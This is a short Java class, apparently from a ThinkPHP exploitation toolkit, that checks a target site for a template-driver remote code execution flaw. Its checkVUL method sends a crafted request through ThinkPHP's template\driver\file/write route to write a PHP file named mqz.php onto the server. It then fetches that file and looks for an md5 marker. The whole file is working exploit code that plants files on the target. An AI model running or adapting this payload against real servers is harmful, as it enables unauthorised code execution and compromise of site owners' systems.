package com.leishianquan.thinkphpexp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class templalte_driver_rce implements BasePayload {
    private static final String CheckStr="56540676a129760a";

    public boolean checkVUL(String url) throws Exception{

        try {
            HttpTool.getHttpReuest(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=mqz.php&content=%3C?phpphp%20var_dump(md5(2333));?%3E", "utf-8");
            String test_result = HttpTool.getHttpReuest(url + "/mqz.php", "utf-8");

            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}